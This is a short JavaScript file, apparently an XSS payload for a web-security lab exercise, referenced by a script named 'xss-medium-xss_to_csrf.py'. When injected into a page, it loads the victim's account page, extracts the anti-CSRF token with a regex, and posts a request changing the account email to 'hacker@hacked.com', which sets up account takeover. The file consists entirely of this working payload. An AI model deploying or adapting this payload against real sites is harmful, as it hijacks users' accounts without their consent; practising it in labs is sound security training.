// Note: Used in script xss-medium-xss_to_csrf.py

async function changeEmail() {
    let response = await fetch("/my-account");
    let data = await response.text();
    let csrf = data.match(/name="csrf" value="(\w+)"/)[1];

    fetch("/my-account/change-email", {
        body: new URLSearchParams({
            "email": 'hacker@hacked.com',
            "csrf" : csrf
        }),
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        method: "post"
    })
}

changeEmail()